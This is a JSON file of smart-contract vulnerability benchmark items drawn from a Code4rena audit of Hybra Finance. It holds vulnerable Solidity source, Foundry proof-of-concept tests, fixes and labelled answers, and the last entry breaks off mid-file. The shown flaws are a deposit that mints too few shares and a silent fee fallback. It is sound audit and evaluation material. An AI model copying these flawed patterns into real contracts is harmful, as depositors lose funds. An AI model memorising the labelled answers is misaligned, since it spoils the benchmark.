[
    {
        "id": "gs_c4_2025-10-hybra-finance_H01",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "H-01",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "high",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "Assets deposited before calculating shares amount to mint will cause users to mint less shares",
        "finding_description": "As we can see, the `GovernanceHYBR::deposit` function first deposits the HYBR into the votingEscrow before calculating and minting shares. This will deposit the tokens first increasing the `totalAssets()` and the new `totalAssets()` will be used in `shares = calculateShares(amount)`. This results in incorrect calculation of shares for the users because their deposits are treated as rewards and they are minted shares with the new rate and will suffer slippage from their own tokens. Example: - Initially Bob has a deposit of 100 gHYBR : 100 HYBR, ie.. 1:1 shares to asset ratio - Alice also enter with 100 assets(HYBR), - In an ideal condition, Alice is expected to recieve 100 shares because the ratio is 1:1 at the time of deposit - but because deposit is done first before calculating shares, - Alice will get, shares = 100 * 100 / (100 +100) i.e. only 50 shares Impact Loss of assets for users by minting less shares.",
        "attack_scenario": "forge test --mt test_test_submissionValidity -vvv function test_submissionValidity() external { address bob = makeAddr(\"bob\"); address alice = makeAddr(\"alice\"); vm.startPrank(address(minter)); hybr.mint(bob, 100e18); hybr.mint(alice, 100e18); vm.stopPrank(); // bob mints gHYBR shares at 1:1 ratio vm.startPrank(bob); hybr.approve(address(gHybr), 100e18); gHybr.deposit(100e18, bob); uint bobShares = gHybr.balanceOf(bob); console.log(\"Bob shares: \", bobShares); uint shareToAssetRatio = gHybr.calculateAssets(1e18); vm.stopPrank(); // Alice mints gHYBR shares at 1:1 ratio but gets less shares due to the incorrect shares calculation vm.startPrank(alice); hybr.approve(address(gHybr), 100e18); gHybr.deposit(100e18, alice); uint aliceShares = gHybr.balanceOf(alice); console.log(\"Alice shares: \", aliceShares); uint aliceShareToAssetRatio = gHybr.calculateAssets(1e18); vm.stopPrank(); console.log(\"ratio after Bob deposits                                              : \", shareToAssetRatio); console.log(\"ratio after Alice deposits even when there was no rewards distribution: \", aliceShareToAssetRatio); } We can see from the test console that Alice recieves less shares than bob with the same assset amount deposits.",
        "fix_description": "Make sure that the ratio at the time of deposit must be used to calculate the shares to mint: IERC20(HYBR).transferFrom(msg.sender, address(this), amount); +       uint256 shares = calculateShares(amount); // Initialize veNFT on first deposit if (veTokenId == 0) { _initializeVeNFT(amount); } else { // Add to existing veNFT IERC20(HYBR).approve(votingEscrow, amount); IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount); // Extend lock to maximum duration _extendLockToMax(); } // Calculate shares to mint based on current totalAssets -       uint256 shares = calculateShares(amount);",
        "primary_file": {
            "path": "ve33/contracts/GovernanceHYBR.sol",
            "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.13;\r\n\r\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\r\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\r\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\r\nimport \"./interfaces/IVotingEscrow.sol\";\r\nimport \"./interfaces/IVoter.sol\";\r\nimport \"./interfaces/IBribe.sol\";\r\nimport \"./interfaces/IRewardsDistributor.sol\";\r\nimport \"./interfaces/IGaugeManager.sol\";\r\nimport \"./interfaces/ISwapper.sol\";\r\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\r\n\r\n/**\r\n * @title GovernanceHYBR (gHYBR)\r\n * @notice Auto-compounding staking token that locks HYBR as veHYBR and compounds rewards\r\n * @dev Implements transfer restrictions for new deposits and automatic reward compounding\r\n */\r\ncontract GrowthHYBR is ERC20, Ownable, ReentrancyGuard {\r\n    using SafeERC20 for IERC20;\r\n    // Lock period for new deposits (configurable between 12-24 hours)\r\n    uint256 public transferLockPeriod = 24 hours;\r\n    uint256 public constant MIN_LOCK_PERIOD = 1 minutes;\r\n    uint256 public constant MAX_LOCK_PERIOD = 240 minutes;\r\n    uint256 public head_not_withdraw_time = 1200; // 5days\r\n    uint256 public tail_not_withdraw_time = 300; // 1day\r\n  \r\n    // Withdraw fee configuration (basis points, 10000 = 100%)\r\n    uint256 public withdrawFee = 100; // 1% default fee\r\n    uint256 public constant MIN_WITHDRAW_FEE = 10; // 0.1% minimum\r\n    uint256 public constant MAX_WITHDRAW_FEE = 1000; // 10% maximum\r\n    uint256 public constant BASIS = 10000;\r\n    address public Team; // Address to receive fees\r\n    uint256 public rebase;\r\n    uint256 public penalty;\r\n    uint256 public votingYield;\r\n    // User deposit tracking for transfer locks\r\n    struct UserLock {\r\n        uint256 amount;\r\n        uint256 unlockTime;\r\n    }\r\n    \r\n    mapping(address => UserLock[]) public userLocks;\r\n    mapping(address => uint256) public lockedBalance;\r\n    \r\n    // Core contracts\r\n    address public immutable HYBR;\r\n    address public immutable votingEscrow;\r\n    address public voter;\r\n    address public rewardsDistributor;\r\n    address public gaugeManager;\r\n    uint256 public veTokenId; // The veNFT owned by this contract\r\n    \r\n    // Auto-voting strategy\r\n    address public operator; // Address that can manage voting strategy\r\n    uint256 public lastVoteEpoch; // Last epoch when we voted\r\n    \r\n    // Reward tracking\r\n    uint256 public lastRebaseTime;\r\n    uint256 public lastCompoundTime;\r\n\r\n    // Swap module\r\n    ISwapper public swapper;\r\n\r\n    // Errors\r\n    error NOT_AUTHORIZED();\r\n    \r\n    // Events\r\n    event Deposit(address indexed user, uint256 hybrAmount, uint256 sharesReceived);\r\n    event Withdraw(address indexed user, uint256 shares, uint256 hybrAmount, uint256 fee);\r\n    event Compound(uint256 rewards, uint256 newTotalLocked);\r\n    event PenaltyRewardReceived(uint256 amount);\r\n    event TransferLockPeriodUpdated(uint256 oldPeriod, uint256 newPeriod);\r\n    event SwapperUpdated(address indexed oldSwapper, address indexed newSwapper);\r\n    event VoterSet(address voter);\r\n    event EmergencyUnlock(address indexed user);\r\n    event AutoVotingEnabled(bool enabled);\r\n    event OperatorUpdated(address indexed oldOperator, address indexed newOperator);\r\n    event DefaultVotingStrategyUpdated(address[] pools, uint256[] weights);\r\n    event AutoVoteExecuted(uint256 epoch, address[] pools, uint256[] weights);\r\n\r\n    constructor(\r\n        address _HYBR,\r\n        address _votingEscrow\r\n    ) ERC20(\"Growth HYBR\", \"gHYBR\") {\r\n        require(_HYBR != address(0), \"Invalid HYBR\");\r\n        require(_votingEscrow != address(0), \"Invalid VE\");\r\n        \r\n        HYBR = _HYBR;\r\n        votingEscrow = _votingEscrow;\r\n        lastRebaseTime = block.timestamp;\r\n        lastCompoundTime = block.timestamp;\r\n        operator = msg.sender; // Initially set deployer as operator\r\n    }\r\n    \r\n    \r\n    function setRewardsDistributor(address _rewardsDistributor) external onlyOwner {\r\n        require(_rewardsDistributor != address(0), \"Invalid rewards distributor\");\r\n        rewardsDistributor = _rewardsDistributor;\r\n    }\r\n    \r\n    function setGaugeManager(address _gaugeManager) external onlyOwner {\r\n        require(_gaugeManager != address(0), \"Invalid gauge manager\");\r\n        gaugeManager = _gaugeManager;\r\n    }\r\n\r\n    \r\n      /**\r\n     * @notice Modifier to check authorization (owner or operator)\r\n     */\r\n    modifier onlyOperator() {\r\n        if (msg.sender != operator) {\r\n            revert NOT_AUTHORIZED();\r\n        }\r\n        _;\r\n    }\r\n    /**\r\n     * @notice Deposit HYBR and receive gHYBR shares\r\n     * @param amount Amount of HYBR to deposit\r\n     * @param recipient Recipient of gHYBR shares\r\n     */\r\n    function deposit(uint256 amount, address recipient) external nonReentrant {\r\n        require(amount > 0, \"Zero amount\");\r\n        recipient = recipient == address(0) ? msg.sender : recipient;\r\n        \r\n        // Transfer HYBR from user first\r\n        IERC20(HYBR).transferFrom(msg.sender, address(this), amount);\r\n        \r\n        // Initialize veNFT on first deposit\r\n        if (veTokenId == 0) {\r\n            _initializeVeNFT(amount);\r\n        } else {\r\n            // Add to existing veNFT\r\n            IERC20(HYBR).approve(votingEscrow, amount);\r\n            IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\r\n\r\n            // Extend lock to maximum duration\r\n            _extendLockToMax();\r\n        }\r\n        \r\n        // Calculate shares to mint based on current totalAssets\r\n        uint256 shares = calculateShares(amount);\r\n        \r\n        // Mint gHYBR shares\r\n        _mint(recipient, shares);\r\n        \r\n        // Add transfer lock for recipient\r\n        _addTransferLock(recipient, shares);\r\n        \r\n        emit Deposit(msg.sender, amount, shares);\r\n    }\r\n\r\n    /**\r\n     * @notice Withdraw gHYBR shares and receive a new veNFT with proportional HYBR\r\n     * @dev Creates new veNFT using multiSplit to maintain proportional ownership\r\n     * @param shares Amount of gHYBR shares to burn\r\n     * @return userTokenId The ID of the new veNFT created for the user\r\n     */\r\n    function withdraw(uint256 shares) external nonReentrant returns (uint256 userTokenId) {\r\n        require(shares > 0, \"Zero shares\");\r\n        require(balanceOf(msg.sender) >= shares, \"Insufficient balance\");\r\n        require(veTokenId != 0, \"No veNFT initialized\");\r\n        require(IVotingEscrow(votingEscrow).voted(veTokenId) == false, \"Cannot withdraw yet\");\r\n        \r\n        uint256 epochStart = HybraTimeLibrary.epochStart(block.timestamp);\r\n        uint256 epochNext = HybraTimeLibrary.epochNext(block.timestamp);\r\n\r\n        require(block.timestamp >= epochStart + head_not_withdraw_time && block.timestamp < epochNext - tail_not_withdraw_time, \"Cannot withdraw yet\");\r\n\r\n        // Calculate proportional HYBR amount from veNFT\r\n        uint256 hybrAmount = calculateAssets(shares);\r\n        require(hybrAmount > 0, \"No assets to withdraw\");\r\n\r\n        // Calculate fee amount (from the HYBR amount, not shares)\r\n        uint256 feeAmount = 0;\r\n        if (withdrawFee > 0) {\r\n            feeAmount = (hybrAmount * withdrawFee) / BASIS;\r\n        }\r\n\r\n        // User receives amount minus fee\r\n        uint256 userAmount = hybrAmount - feeAmount;\r\n        require(userAmount > 0, \"Amount too small after fee\");\r\n\r\n        // Get actual HYBR locked amount (not voting power)\r\n        uint256 veBalance = totalAssets();\r\n        require(hybrAmount <= veBalance, \"Insufficient veNFT balance\");\r\n\r\n        uint256 remainingAmount = veBalance - userAmount - feeAmount;  \r\n        require(remainingAmount >= 0, \"Cannot withdraw entire veNFT\");\r\n\r\n        // Burn gHYBR shares (full amount)\r\n        _burn(msg.sender, shares);\r\n\r\n        // Use multiSplit to create two NFTs: one for user, one for contract\r\n        uint256[] memory amounts = new uint256[](3);\r\n        amounts[0] = remainingAmount; // Amount staying with gHYBR \r\n        amounts[1] = userAmount;      // Amount going to user (after fee)\r\n        amounts[2] = feeAmount;      // Amount going to fee recipient\r\n\r\n\r\n        uint256[] memory newTokenIds = IVotingEscrow(votingEscrow).multiSplit(veTokenId, amounts);\r\n    \r\n        // Update contract's veTokenId to the first new token\r\n        veTokenId = newTokenIds[0];\r\n        userTokenId = newTokenIds[1];\r\n        uint256 feeTokenId = newTokenIds[2];\r\n        // Note: userTokenId is transferred to user, they can manage their own lock time\r\n        IVotingEscrow(votingEscrow).safeTransferFrom(address(this), msg.sender, userTokenId);\r\n        IVotingEscrow(votingEscrow).safeTransferFrom(address(this), Team, feeTokenId);\r\n        emit Withdraw(msg.sender, shares, userAmount, feeAmount);\r\n    }\r\n\r\n\r\n    /**\r\n     * @notice Internal function to initialize veNFT on first deposit\r\n     */\r\n    function _initializeVeNFT(uint256 initialAmount) internal {\r\n        // Create max lock with the initial deposit amount\r\n        IERC20(HYBR).approve(votingEscrow, type(uint256).max);\r\n        uint256 lockTime = HybraTimeLibrary.MAX_LOCK_DURATION;\r\n        \r\n        // Create lock with initial amount\r\n        veTokenId = IVotingEscrow(votingEscrow).create_lock_for(initialAmount, lockTime, address(this));\r\n        \r\n    }\r\n    \r\n    /**\r\n     * @notice Calculate shares to mint based on deposit amount\r\n     */\r\n    function calculateShares(uint256 amount) public view returns (uint256) {\r\n        uint256 _totalSupply = totalSupply();\r\n        uint256 _totalAssets = totalAssets();\r\n        if (_totalSupply == 0 || _totalAssets == 0) {\r\n            return amount;\r\n        }\r\n        return (amount * _totalSupply) / _totalAssets;\r\n    }\r\n    \r\n    /**\r\n     * @notice Calculate HYBR value of shares\r\n     */\r\n    function calculateAssets(uint256 shares) public view returns (uint256) {\r\n        uint256 _totalSupply = totalSupply();\r\n        if (_totalSupply == 0) {\r\n            return shares;\r\n        }\r\n        return (shares * totalAssets()) / _totalSupply;\r\n    }\r\n\r\n    \r\n    /**\r\n     * @notice Get total assets (HYBR) locked in veNFT\r\n     * @dev Returns actual HYBR amount, not voting power\r\n     */\r\n    function totalAssets() public view returns (uint256) {\r\n        if (veTokenId == 0) {\r\n            return 0;\r\n        }\r\n        // Get actual locked HYBR amount, not voting power\r\n        IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\r\n        return uint256(int256(locked.amount));\r\n    }\r\n    \r\n    /**\r\n     * @notice Add transfer lock for new deposits\r\n     */\r\n    function _addTransferLock(address user, uint256 amount) internal {\r\n        uint256 unlockTime = block.timestamp + transferLockPeriod;\r\n        userLocks[user].push(UserLock({\r\n            amount: amount,\r\n            unlockTime: unlockTime\r\n        }));\r\n        lockedBalance[user] += amount;\r\n    }\r\n    \r\n\r\n\r\n    /**\r\n     * @notice Preview available balance (total - currently locked)\r\n     * @param user The user address to check\r\n     * @return available The current available balance for transfer\r\n     */\r\n    function previewAvailable(address user) external view returns (uint256 available) {\r\n        uint256 totalBalance = balanceOf(user);\r\n        uint256 currentLocked = 0;\r\n        \r\n        UserLock[] storage arr = userLocks[user];\r\n        for (uint256 i = 0; i < arr.length; i++) {\r\n            if (arr[i].unlockTime > block.timestamp) {\r\n                currentLocked += arr[i].amount;\r\n            }\r\n        }\r\n        \r\n        return totalBalance > currentLocked ? totalBalance - currentLocked : 0;\r\n    }\r\n    /**\r\n     * @notice Clean expired locks and update locked balance\r\n     * @param user The user address to clean locks for\r\n     * @return freed The amount of tokens freed from expired locks\r\n     */\r\n    function _cleanExpired(address user) internal returns (uint256 freed) {\r\n        UserLock[] storage arr = userLocks[user];\r\n        uint256 len = arr.length;\r\n        if (len == 0) return 0;\r\n\r\n        uint256 write = 0;\r\n        unchecked {\r\n            for (uint256 i = 0; i < len; i++) {\r\n                UserLock memory L = arr[i];\r\n                if (L.unlockTime <= block.timestamp) {\r\n                    freed += L.amount;\r\n                } else {\r\n                    if (write != i) arr[write] = L;\r\n                    write++;\r\n                }\r\n            }\r\n            if (freed > 0) {\r\n                lockedBalance[user] -= freed;\r\n            }\r\n            while (arr.length > write) {\r\n                arr.pop();\r\n            }\r\n        }\r\n    }\r\n    \r\n    \r\n    /**\r\n     * @notice Override transfer to implement lock mechanism\r\n     */\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        super._beforeTokenTransfer(from, to, amount);\r\n        \r\n        if (from != address(0) && to != address(0)) { // Not mint or burn\r\n            uint256 totalBalance = balanceOf(from);\r\n            \r\n            // Step 1: Check current available balance using cached lockedBalance\r\n            uint256 currentAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\r\n            \r\n            // Step 2: If current available >= amount, pass directly\r\n            if (currentAvailable >= amount) {\r\n                return;\r\n            }\r\n            \r\n            // Step 3: Not enough, clean expired locks and recalculate\r\n            _cleanExpired(from);\r\n            uint256 finalAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\r\n            \r\n            // Step 4: Check final available balance\r\n            require(finalAvailable >= amount, \"Tokens locked\");\r\n        }\r\n    }\r\n    \r\n    /**\r\n     * @notice Claim all rewards from voting and rebase\r\n     */\r\n    function claimRewards() external onlyOperator {\r\n        require(voter != address(0), \"Voter not set\");\r\n        require(rewardsDistributor != address(0), \"Distributor not set\");\r\n              \r\n        // Claim rebase rewards from RewardsDistributor\r\n        uint256  rebaseAmount = IRewardsDistributor(rewardsDistributor).claim(veTokenId);\r\n        rebase += rebaseAmount;\r\n        // Claim bribes from voted pools\r\n        address[] memory votedPools = IVoter(voter).poolVote(veTokenId);\r\n        \r\n        for (uint256 i = 0; i < votedPools.length; i++) {\r\n            if (votedPools[i] != address(0)) {\r\n                address gauge = IGaugeManager(gaugeManager).gauges(votedPools[i]);\r\n                \r\n                if (gauge != address(0)) {\r\n                    // Prepare arrays for single bribe claim\r\n                    address[] memory bribes = new address[](1);\r\n                    address[][] memory tokens = new address[][](1);\r\n                    \r\n                    // Claim internal bribe (trading fees)\r\n                    address internalBribe = IGaugeManager(gaugeManager).internal_bribes(gauge);\r\n                    if (internalBribe != address(0)) {\r\n                        uint256 tokenCount = IBribe(internalBribe).rewardsListLength();\r\n                        if (tokenCount > 0) {\r\n                            address[] memory bribeTokens = new address[](tokenCount);\r\n                            for (uint256 j = 0; j < tokenCount; j++) {\r\n                                bribeTokens[j] = IBribe(internalBribe).bribeTokens(j);\r\n                            }\r\n                            bribes[0] = internalBribe;\r\n                            tokens[0] = bribeTokens;\r\n                            // Call claimBribes for this single bribe\r\n                            IGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\r\n                        }\r\n                    }\r\n                    \r\n                    // Claim external bribe\r\n                    address externalBribe = IGaugeManager(gaugeManager).external_bribes(gauge);\r\n                    if (externalBribe != address(0)) {\r\n                        uint256 tokenCount = IBribe(externalBribe).rewardsListLength();\r\n                        if (tokenCount > 0) {\r\n                            address[] memory bribeTokens = new address[](tokenCount);\r\n                            for (uint256 j = 0; j < tokenCount; j++) {\r\n                                bribeTokens[j] = IBribe(externalBribe).bribeTokens(j);\r\n                            }\r\n                            bribes[0] = externalBribe;\r\n                            tokens[0] = bribeTokens;\r\n                            // Call claimBribes for this single bribe\r\n                            IGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n    \r\n \r\n\r\n    /**\r\n     * @notice Execute swap through the configured swapper module\r\n     * @param _params Swap parameters for the swapper module\r\n     */\r\n    function executeSwap(ISwapper.SwapParams calldata _params) external nonReentrant onlyOperator {\r\n        require(address(swapper) != address(0), \"Swapper not set\");\r\n\r\n        // Get token balance before swap\r\n        uint256 tokenBalance = IERC20(_params.tokenIn).balanceOf(address(this));\r\n        require(tokenBalance >= _params.amountIn, \"Insufficient token balance\");\r\n\r\n        // Approve swapper to spend tokens\r\n        IERC20(_params.tokenIn).safeApprove(address(swapper), _params.amountIn);\r\n\r\n        // Execute swap through swapper module\r\n        uint256 hybrReceived = swapper.swapToHYBR(_params);\r\n\r\n        // Reset approval for safety\r\n        IERC20(_params.tokenIn).safeApprove(address(swapper), 0);\r\n\r\n        // HYBR is now in this contract, ready for compounding\r\n        votingYield += hybrReceived;\r\n    }\r\n    \r\n    /**\r\n     * @notice Compound HYBR balance into veNFT (restricted to authorized users)\r\n     */\r\n    function compound() external onlyOperator {\r\n        \r\n        // Get current HYBR balance\r\n        uint256 hybrBalance = IERC20(HYBR).balanceOf(address(this));\r\n        \r\n        if (hybrBalance > 0) {\r\n            // Lock all HYBR to existing veNFT  \r\n            IERC20(HYBR).safeApprove(votingEscrow, hybrBalance);\r\n            IVotingEscrow(votingEscrow).deposit_for(veTokenId, hybrBalance);\r\n\r\n            // Extend lock to maximum duration\r\n            _extendLockToMax();\r\n\r\n            lastCompoundTime = block.timestamp;\r\n\r\n            emit Compound(hybrBalance, totalAssets());\r\n        }\r\n    }\r\n    \r\n    /**\r\n     * @notice Vote for gauges using the veNFT\r\n     * @param _poolVote Array of pools to vote for\r\n     * @param _weights Array of weights for each pool\r\n     */\r\n    function vote(address[] calldata _poolVote, uint256[] calldata _weights) external {\r\n        require(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\r\n        require(voter != address(0), \"Voter not set\");\r\n        \r\n        IVoter(voter).vote(veTokenId, _poolVote, _weights);\r\n        lastVoteEpoch = HybraTimeLibrary.epochStart(block.timestamp);\r\n        \r\n    }\r\n    \r\n    /**\r\n     * @notice Reset votes\r\n     */\r\n    function reset() external {\r\n        require(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\r\n        require(voter != address(0), \"Voter not set\");\r\n        \r\n        IVoter(voter).reset(veTokenId);\r\n    }\r\n    \r\n    /**\r\n     * @notice Receive penalty rewards from rHYBR conversions\r\n     */\r\n    function receivePenaltyReward(uint256 amount) external {\r\n        \r\n        // Auto-compound penalty rewards to existing veNFT\r\n        if (amount > 0) {\r\n            IERC20(HYBR).approve(votingEscrow, amount);\r\n\r\n            if(veTokenId == 0){\r\n                _initializeVeNFT(amount);\r\n            } else{\r\n                IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\r\n\r\n                // Extend lock to maximum duration\r\n                _extendLockToMax();\r\n            }\r\n        }\r\n        penalty += amount;\r\n        emit PenaltyRewardReceived(amount);\r\n    }\r\n       \r\n    /**\r\n     * @notice Set the voter contract\r\n     */\r\n    function setVoter(address _voter) external onlyOwner {\r\n        require(_voter != address(0), \"Invalid voter\");  \r\n        voter = _voter;\r\n        emit VoterSet(_voter);\r\n    }\r\n    \r\n    /**\r\n     * @notice Update transfer lock period\r\n     */\r\n    function setTransferLockPeriod(uint256 _period) external onlyOwner {\r\n        require(_period >= MIN_LOCK_PERIOD && _period <= MAX_LOCK_PERIOD, \"Invalid period\");\r\n        uint256 oldPeriod = transferLockPeriod;\r\n        transferLockPeriod = _period;\r\n        emit TransferLockPeriodUpdated(oldPeriod, _period);\r\n    }\r\n\r\n    /**\r\n     * @notice Set withdraw fee (in basis points)\r\n     * @param _fee Fee amount (10-30 basis points)\r\n     */\r\n    function setWithdrawFee(uint256 _fee) external onlyOwner {\r\n        require(_fee >= MIN_WITHDRAW_FEE && _fee <= MAX_WITHDRAW_FEE, \"Invalid fee\");\r\n        withdrawFee = _fee;\r\n    }\r\n\r\n\r\n    function setHeadNotWithdrawTime(uint256 _time) external onlyOwner {\r\n        head_not_withdraw_time = _time;\r\n    }\r\n\r\n    function setTailNotWithdrawTime(uint256 _time) external onlyOwner {\r\n        tail_not_withdraw_time = _time;\r\n    }\r\n    \r\n    /**\r\n     * @notice Set the swapper module\r\n     * @param _swapper Address of the swapper module\r\n     */\r\n    function setSwapper(address _swapper) external onlyOwner {\r\n        require(_swapper != address(0), \"Invalid swapper\");\r\n        address oldSwapper = address(swapper);\r\n        swapper = ISwapper(_swapper);\r\n        emit SwapperUpdated(oldSwapper, _swapper);\r\n    }\r\n    \r\n    /**\r\n     * @notice Set the team address\r\n     */\r\n    function setTeam(address _team) external onlyOwner {\r\n        require(_team != address(0), \"Invalid team\");\r\n        Team = _team;\r\n    }\r\n    \r\n    /**\r\n     * @notice Emergency unlock for a user (owner only)\r\n     */\r\n    function emergencyUnlock(address user) external onlyOperator {\r\n        delete userLocks[user];\r\n        lockedBalance[user] = 0;\r\n        emit EmergencyUnlock(user);\r\n    }\r\n\r\n    /**\r\n     * @notice Get user's locks info\r\n     */\r\n    function getUserLocks(address user) external view returns (UserLock[] memory) {\r\n        return userLocks[user];\r\n    }\r\n    \r\n    \r\n \r\n    \r\n  \r\n    \r\n    /**\r\n     * @notice Set operator address\r\n     */\r\n    function setOperator(address _operator) external onlyOwner {\r\n        require(_operator != address(0), \"Invalid operator\");\r\n        address oldOperator = operator;\r\n        operator = _operator;\r\n        emit OperatorUpdated(oldOperator, _operator);\r\n    }\r\n    \r\n\r\n\r\n\r\n    \r\n    /**\r\n     * @notice Get veNFT lock end time\r\n     */\r\n    function getLockEndTime() external view returns (uint256) {\r\n        if (veTokenId == 0) {\r\n            return 0;\r\n        }\r\n        IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\r\n        return uint256(locked.end);\r\n    }\r\n\r\n    /**\r\n     * @notice Internal helper to safely extend lock to maximum duration\r\n     * @dev Calculates exact duration needed to reach max allowed unlock time\r\n     */\r\n    function _extendLockToMax() internal {\r\n        if (veTokenId == 0) return;\r\n\r\n        IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\r\n        if (locked.isPermanent || locked.end <= block.timestamp) return;\r\n\r\n        uint256 maxUnlockTime = ((block.timestamp + HybraTimeLibrary.MAX_LOCK_DURATION) / HybraTimeLibrary.WEEK) * HybraTimeLibrary.WEEK;\r\n\r\n        // Only extend if difference is more than 2 hours\r\n        if (maxUnlockTime > locked.end + 2 hours) {\r\n            try IVotingEscrow(votingEscrow).increase_unlock_time(veTokenId, HybraTimeLibrary.MAX_LOCK_DURATION) {\r\n                // Extension successful\r\n            } catch {\r\n                // Extension failed, continue without error\r\n                // This can happen if already at max possible time or other constraints\r\n            }\r\n        }\r\n    }\r\n\r\n}",
            "vulnerable_lines": [
                137,
                138,
                139,
                140,
                141,
                142,
                143,
                144
            ],
            "vulnerable_functions": [
                "deposit"
            ]
        },
        "context_files": [],
        "call_flow": "User.deposit() -> IVotingEscrow.deposit_for() -> totalAssets() increases -> calculateShares(amount) -> _mint(shares) [reduced due to self-slippage]",
        "context_hint": "The deposit logic updates totalAssets before share calculation, causing depositors to receive fewer shares than expected based on the pre-deposit ratio.",
        "is_vulnerable": true
    },
    {
        "id": "gs_c4_2025-10-hybra-finance_M01",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "M-01",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 1,
        "context_level": "single_file",
        "finding_title": "CLFactory ignores dynamic fees above 10% and silently falls back to default",
        "finding_description": "Governance can configure `DynamicSwapFeeModule` with fees up to 50%, but `CLFactory.getSwapFee` discards any value above 100_000 ppm (10%) and falls back to the tick-spacing default (often 500 ppm = 0.05%) without reverting or logging. Operators see the module reporting 20%, yet users continue paying the tiny default fee. The silent fallback misleads governance into believing higher fees are active. Impact - Governance believes a protective high fee is set (e.g., during launch anti-MEV), but the effective fee drops back to the default (e.g., 0.05%). - Traders are charged far less than intended, defeating protective or revenue objectives. - The misconfiguration has no on-chain signal, so the mistake can persist unnoticed. Root Cause - getSwapFee checks fee <= 100_000 ; larger values are ignored and the function returns tickSpacingToFee . - The module itself allows feeCap up to 500_000 (50%), so governance can set a value the factory immediately discards in favor of the default.",
        "attack_scenario": "cd cl forge test --match-path test/PoC_DynamicFee_ClampToDefault.t.sol -vvv The PoC lifts the module cap, sets a 20% custom fee, and shows that `DynamicSwapFeeModule.getFee` returns 200_000 while `CLFactory.getSwapFee` still returns the base 500 ppm. PoC source ( `cl/test/PoC_DynamicFee_ClampToDefault.t.sol` ): // SPDX-License-Identifier: MIT pragma solidity 0.7.6; pragma abicoder v2; import \"forge-std/Test.sol\"; import {C4PoCTestbed} from \"./C4PoCTestbed.t.sol\"; import {DynamicSwapFeeModule} from \"contracts/core/fees/DynamicSwapFeeModule.sol\"; contract PoC_DynamicFee_ClampToDefault is C4PoCTestbed { address internal pool; function setUp() public override { super.setUp(); pool = poolFactory.createPool(USDC, DAI, 100, uint160(2 ** 96)); require(pool != address(0), \"pool not created\"); } function testFactoryClampsFeeAboveTenPercent() public { address manager = poolFactory.swapFeeManager(); vm.prank(manager); swapFeeModule.setFeeCap(pool, 500_000); // raise module cap to 50% vm.prank(manager); swapFeeModule.setScalingFactor(pool, 1); // ensure positive TWAP delta doesn't zero fee uint24 highFee = 200_000; // 20% vm.prank(manager); swapFeeModule.setCustomFee(pool, highFee); uint24 moduleFee = swapFeeModule.getFee(pool); assertEq(uint256(moduleFee), uint256(highFee), \"module reports configured fee\"); uint24 factoryFee = poolFactory.getSwapFee(pool); assertEq(uint256(factoryFee), 500, \"factory silently clamps to tick-spacing default\"); } }",
        "fix_description": "Either revert when the module returns > 100_000 or raise the factory ceiling to match the module’s cap. Emit events or add admin tooling to surface out-of-range configurations so operators can correct them. Hybra Finance mitigated: Added setMaxFee() function to make the fee cap configurable by the owner (up to 50%). This replaces the hardcoded limit and allows governance to adjust the maximum dynamic fee when needed.",
        "primary_file": {
            "path": "cl/contracts/core/CLFactory.sol",
            "content": "// SPDX-License-Identifier: GPL-2.0-or-later\r\npragma solidity =0.7.6;\r\n\r\nimport \"./interfaces/ICLFactory.sol\";\r\nimport \"./interfaces/fees/IFeeModule.sol\";\r\n\r\nimport \"./interfaces/IGaugeManager.sol\";\r\nimport \"./interfaces/IFactoryRegistry.sol\";\r\nimport \"@openzeppelin/contracts/proxy/Clones.sol\";\r\nimport \"@nomad-xyz/src/ExcessivelySafeCall.sol\";\r\nimport \"./CLPool.sol\";\r\n\r\n/// @title Canonical CL factory\r\n/// @notice Deploys CL pools and manages ownership and control over pool protocol fees\r\ncontract CLFactory is ICLFactory {\r\n    using ExcessivelySafeCall for address;\r\n\r\n    /// @inheritdoc ICLFactory\r\n    IGaugeManager public override gaugeManager;\r\n    /// @inheritdoc ICLFactory\r\n    address public immutable override poolImplementation;\r\n    /// @inheritdoc ICLFactory\r\n    address public override owner;\r\n    /// @inheritdoc ICLFactory\r\n    address public override swapFeeManager;\r\n    /// @inheritdoc ICLFactory\r\n    address public override swapFeeModule;\r\n    /// @inheritdoc ICLFactory\r\n    address public override unstakedFeeManager;\r\n    /// @inheritdoc ICLFactory\r\n    address public override unstakedFeeModule;\r\n    /// @inheritdoc ICLFactory\r\n    uint24 public override defaultUnstakedFee;\r\n    /// @inheritdoc ICLFactory\r\n\r\n    address public override 